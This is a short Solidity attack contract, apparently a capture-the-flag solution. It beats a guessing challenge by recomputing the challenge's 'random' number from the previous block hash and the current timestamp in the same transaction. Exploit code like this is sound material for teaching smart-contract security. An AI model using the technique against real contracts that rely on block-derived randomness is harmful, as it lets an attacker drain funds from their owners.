pragma solidity 0.4.22;

import "../GuessTheNewNumberChallenge.sol";

contract RandomAttack {
    GuessTheNewNumberChallenge public victim;
    uint8 public answer;

    function attack(address victimAddress) public {
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        // address payable victim;
        victim = GuessTheNewNumberChallenge(victimAddress);
        victim.guess(answer);
    }
}
